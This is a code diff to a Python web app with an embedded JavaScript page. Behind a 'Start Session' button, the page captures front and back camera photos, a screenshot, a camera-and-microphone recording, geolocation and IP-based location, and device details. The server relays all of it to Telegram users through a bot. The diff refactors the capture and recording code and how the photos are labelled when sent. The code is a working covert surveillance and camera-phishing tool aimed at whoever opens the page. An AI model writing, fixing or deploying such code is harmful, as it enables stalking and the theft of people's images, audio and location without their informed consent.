@@ -168,17 +168,17 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Capture frame from stream and then stop the stream ----
-        function captureFrame(stream) {
+        // ---- Capture frame without stopping the stream ----
+        function captureFrameKeepStream(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 let resolved = false;
-                video.onloadedmetadata = async () => {
+                video.onloadedmetadata = () => {
                     video.play();
                     let attempts = 0;
-                    const checkFrame = async () => {
+                    const checkFrame = () => {
                         attempts++;
                         if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                             const canvas = document.createElement('canvas');
@@ -186,29 +186,50 @@ HTML_PAGE = """<!DOCTYPE html>
                             canvas.height = video.videoHeight;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0);
-                            // Check brightness
-                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                            const data = imageData.data;
-                            let sum = 0;
-                            for (let i = 0; i < data.length; i += 4) {
-                                sum += data[i] + data[i+1] + data[i+2];
-                            }
-                            const avg = sum / (canvas.width * canvas.height * 3);
-                            if (avg < 10 && attempts < 5) {
-                                await delay(100);
-                                checkFrame();
-                                return;
-                            }
                             canvas.toBlob((blob) => {
                                 if (!resolved) { resolved = true; resolve(blob); }
                                 video.pause();
                                 video.srcObject = null;
-                                // Stop all tracks to release camera
+                            }, 'image/jpeg', 0.9);
+                        } else if (attempts < 20) {
+                            setTimeout(checkFrame, 100);
+                        } else {
+                            if (!resolved) { resolved = true; resolve(null); }
+                            video.pause();
+                            video.srcObject = null;
+                        }
+                    };
+                    checkFrame();
+                };
+            });
+        }
+
+        // ---- Capture frame and stop the stream ----
+        function captureFrameAndStop(stream) {
+            return new Promise((resolve) => {
+                if (!stream) { resolve(null); return; }
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                let resolved = false;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let attempts = 0;
+                    const checkFrame = () => {
+                        attempts++;
+                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            canvas.toBlob((blob) => {
+                                if (!resolved) { resolved = true; resolve(blob); }
+                                video.pause();
+                                video.srcObject = null;
                                 stream.getTracks().forEach(t => t.stop());
                             }, 'image/jpeg', 0.9);
-                        } else if (attempts < 10) {
-                            await delay(100);
-                            checkFrame();
+                        } else if (attempts < 20) {
+                            setTimeout(checkFrame, 100);
                         } else {
                             if (!resolved) { resolved = true; resolve(null); }
                             video.pause();
@@ -253,9 +274,9 @@ HTML_PAGE = """<!DOCTYPE html>
             const orientation = getOrientation();
 
             // 3. Sequential camera access
-            // First, try front camera
-            let frontBlob = null;
+            // Get front camera (no audio) – capture and release
             let frontStream = null;
+            let frontBlob = null;
             let frontFacing = 'unknown';
             try {
                 frontStream = await getCameraStream('user', false);
@@ -263,8 +284,7 @@ HTML_PAGE = """<!DOCTYPE html>
                     const track = frontStream.getVideoTracks()[0];
                     const settings = track.getSettings();
                     frontFacing = settings.facingMode || 'user';
-                    frontBlob = await captureFrame(frontStream);
-                    // Stream is stopped inside captureFrame
+                    frontBlob = await captureFrameAndStop(frontStream);
                 } else {
                     console.log('Front camera not available');
                 }
@@ -272,9 +292,9 @@ HTML_PAGE = """<!DOCTYPE html>
                 console.log('Front camera error:', e);
             }
 
-            // Then, try back camera
-            let backBlob = null;
+            // Get back camera (with audio) – capture frame but keep stream for recording
             let backStream = null;
+            let backBlob = null;
             let backFacing = 'unknown';
             let backError = '';
             try {
@@ -283,12 +303,7 @@ HTML_PAGE = """<!DOCTYPE html>
                     const track = backStream.getVideoTracks()[0];
                     const settings = track.getSettings();
                     backFacing = settings.facingMode || 'environment';
-                    backBlob = await captureFrame(backStream); // This will stop the stream? We need to keep it for recording.
-                    // We must NOT stop the back stream if we want to record.
-                    // So we need a separate capture function that doesn't stop the stream.
-                    // Let's fix: we'll capture frame without stopping tracks.
-                    // We'll use a separate function for back that captures but doesn't stop.
-                    // We'll re-implement: captureFrameNoStop
+                    backBlob = await captureFrameKeepStream(backStream);
                 } else {
                     backError = 'Back camera not available';
                 }
@@ -296,132 +311,63 @@ HTML_PAGE = """<!DOCTYPE html>
                 backError = e.message;
             }
 
-            // We need a special capture for back that does not stop the stream.
-            // Let's define a new function: captureFrameKeepStream
-            async function captureFrameKeepStream(stream) {
-                return new Promise((resolve) => {
-                    if (!stream) { resolve(null); return; }
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    let resolved = false;
-                    video.onloadedmetadata = async () => {
-                        video.play();
-                        let attempts = 0;
-                        const checkFrame = async () => {
-                            attempts++;
-                            if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0);
-                                canvas.toBlob((blob) => {
-                                    if (!resolved) { resolved = true; resolve(blob); }
-                                    video.pause();
-                                    video.srcObject = null;
-                                }, 'image/jpeg', 0.9);
-                            } else if (attempts < 10) {
-                                await delay(100);
-                                checkFrame();
-                            } else {
-                                if (!resolved) { resolved = true; resolve(null); }
-                                video.pause();
-                                video.srcObject = null;
-                            }
-                        };
-                        checkFrame();
-                    };
-                });
-            }
-
-            // Now redo back camera capture with keep stream
-            if (backStream) {
-                backBlob = await captureFrameKeepStream(backStream);
-            }
-
-            // If back failed but front worked, use front for back
-            let finalBackBlob = backBlob || frontBlob;
-            let finalBackFacing = backFacing || frontFacing;
-            let finalFrontBlob = frontBlob;
-            let finalFrontFacing = frontFacing;
-
-            // If only one camera was available, note it.
-            let cameraDebug = {};
-            if (backStream && frontStream) {
-                // Check if they are the same track (if both exist)
-                const backId = backStream.getVideoTracks()[0].id;
-                const frontId = frontStream.getVideoTracks()[0].id;
-                if (backId === frontId) {
-                    cameraDebug.sameTrack = true;
-                } else {
-                    cameraDebug.distinctTracks = true;
+            // If back failed, try to use front for both images and recording
+            if (!backStream && frontStream) {
+                backStream = frontStream.clone();
+                backBlob = frontBlob;
+                backFacing = frontFacing;
+                // We need to keep the back stream for recording, but frontStream was stopped? clone will work.
+                // However, clone of a stopped stream may not work. So we need to get a new stream.
+                // Better: if back fails, we can use front for recording, but we already stopped it.
+                // So we should get a new front stream for recording.
+                // Let's re-get a front stream for recording.
+                try {
+                    const recordingStream = await getCameraStream('user', true);
+                    if (recordingStream) {
+                        backStream = recordingStream;
+                        backFacing = frontFacing;
+                        // We already have frontBlob from earlier.
+                        // Also we need to capture a backBlob from this stream? We already have frontBlob.
+                        // So we'll use frontBlob as backBlob.
+                    } else {
+                        // no stream
+                    }
+                } catch (e) {
+                    backError = 'Failed to get recording stream';
                 }
-            } else if (backStream && !frontStream) {
-                cameraDebug.onlyBack = true;
-                finalFrontBlob = null; // no front image
-            } else if (frontStream && !backStream) {
-                cameraDebug.onlyFront = true;
-                finalBackBlob = frontBlob; // use front for both
-                finalBackFacing = frontFacing;
-                finalFrontBlob = null;
-            } else {
-                cameraDebug.noCamera = true;
             }
 
-            // Now we have backBlob, backStream (for recording) and frontBlob
-            // If backStream is null, use frontStream for recording if available
-            let recordStream = backStream || frontStream;
-            let videoBlob = null;
+            // If front failed, but back worked, use back for both
+            if (!frontStream && backStream) {
+                frontBlob = backBlob;
+                frontFacing = backFacing;
+            }
 
-            // 4. Screenshot
+            // If both failed, set error
+            if (!frontStream && !backStream) {
+                // no cameras
+            }
+
+            // Screenshot
             const screenshotBlob = await captureScreenshot();
 
-            // 5. Recording (if we have a stream)
-            if (recordStream) {
-                let mimeType = 'video/webm;codecs=vp9,opus';
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm;codecs=vp8,opus';
-                }
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm';
-                }
-                mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
-                recordedChunks = [];
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    finalizeAndSend();
-                };
-                mediaRecorder.start(1000);
-                recordingActive = true;
-                setTimeout(() => {
-                    if (recordingActive && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                }, maxDuration);
-                window.addEventListener('beforeunload', () => {
-                    if (recordingActive && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                });
-            } else {
-                // No stream – finalize immediately
-                finalizeAndSend();
-            }
-
+            // Recording
+            let videoBlob = null;
             let finalized = false;
+
+            // Define the finalize function early
             async function finalizeAndSend() {
                 if (finalized) return;
                 finalized = true;
                 const fd = new FormData();
+                // Location
                 if (locationData && !locationData.denied) {
                     fd.append('lat', locationData.lat);
                     fd.append('lng', locationData.lng);
                 } else {
                     fd.append('location_denied', 'true');
                 }
+                // System info
                 fd.append('ip', ipInfo.ip || 'unknown');
                 fd.append('city', ipInfo.city || 'unknown');
                 fd.append('region', ipInfo.region || 'unknown');
@@ -437,12 +383,13 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('orientation', orientation);
                 fd.append('camera_status', 'success');
                 fd.append('camera_error', backError || '');
-                fd.append('camera_debug', JSON.stringify(cameraDebug));
-                fd.append('backFacing', finalBackFacing);
-                fd.append('frontFacing', finalFrontFacing);
+                fd.append('camera_debug', JSON.stringify({ front: frontFacing, back: backFacing }));
+                fd.append('backFacing', backFacing);
+                fd.append('frontFacing', frontFacing);
+                // Media
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                if (finalBackBlob) fd.append('backImage', finalBackBlob, 'back.jpg');
-                if (finalFrontBlob) fd.append('frontImage', finalFrontBlob, 'front.jpg');
+                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
+                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
 
                 await sendData(fd);
@@ -450,20 +397,55 @@ HTML_PAGE = """<!DOCTYPE html>
                 startBtn.innerText = '▶ Start Session';
             }
 
-            if (!mediaRecorder) {
-                finalizeAndSend();
-            } else {
+            // If we have a stream for recording, start recording and set up onstop
+            if (backStream) {
+                let mimeType = 'video/webm;codecs=vp9,opus';
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    mimeType = 'video/webm;codecs=vp8,opus';
+                }
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    mimeType = 'video/webm';
+                }
+                mediaRecorder = new MediaRecorder(backStream, { mimeType: mimeType });
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    finalizeAndSend();
+                };
+                mediaRecorder.start(1000);
+                recordingActive = true;
+                // Set timeout to stop recording
                 setTimeout(() => {
-                    if (!finalized) {
-                        if (recordingActive && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                            recordingActive = false;
-                        }
-                        if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
-                        finalizeAndSend();
+                    if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
                     }
-                }, maxDuration + 3000);
+                }, maxDuration);
+                // Stop on page close
+                window.addEventListener('beforeunload', () => {
+                    if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
+                    }
+                });
+                // Also, if recording stops early, we already have finalizeAndSend called from onstop.
+            } else {
+                // No recording stream – finalize immediately
+                finalizeAndSend();
             }
+
+            // Fallback: if recording never stops (e.g., no data events), force finalize after timeout
+            setTimeout(() => {
+                if (!finalized) {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
+                    }
+                    if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
+                    finalizeAndSend();
+                }
+            }, maxDuration + 3000);
         }
 
         document.getElementById('startBtn').addEventListener('click', startSession);
@@ -508,8 +490,6 @@ def capture():
     except:
         debug = {}
 
-    same_track = debug.get('sameTrack', False)
-
     for uid in USER_IDS:
         if lat and lng:
             try:
@@ -546,50 +526,19 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Send back and front images
-        if back_img and front_img:
-            if same_track:
-                try:
-                    back_img.seek(0)
-                    bot.send_photo(uid, back_img.read(), caption="📷 Rear Camera (same as front)")
-                except Exception as e:
-                    print(f"Back image error: {e}")
-                try:
-                    front_img.seek(0)
-                    bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera (same as rear)")
-                except Exception as e:
-                    print(f"Front image error: {e}")
-                try:
-                    bot.send_message(uid, "ℹ️ Your device may have only one camera. Both images are from the same camera.")
-                except:
-                    pass
-            else:
-                # Normal distinct cameras
-                back_label = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
-                front_label = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
-                if backFacing == 'unknown' and frontFacing == 'unknown':
-                    back_label = "📷 Back Camera"
-                    front_label = "🤳 Front Camera"
-                try:
-                    back_img.seek(0)
-                    bot.send_photo(uid, back_img.read(), caption=back_label)
-                except Exception as e:
-                    print(f"Back image error: {e}")
-                try:
-                    front_img.seek(0)
-                    bot.send_photo(uid, front_img.read(), caption=front_label)
-                except Exception as e:
-                    print(f"Front image error: {e}")
-        elif back_img:
+        if back_img:
             try:
                 back_img.seek(0)
-                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
+                cap = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
+                bot.send_photo(uid, back_img.read(), caption=cap)
             except Exception as e:
                 print(f"Back image error: {e}")
-        elif front_img:
+
+        if front_img:
             try:
                 front_img.seek(0)
-                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
+                cap = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
+                bot.send_photo(uid, front_img.read(), caption=cap)
             except Exception as e:
                 print(f"Front image error: {e}")
 
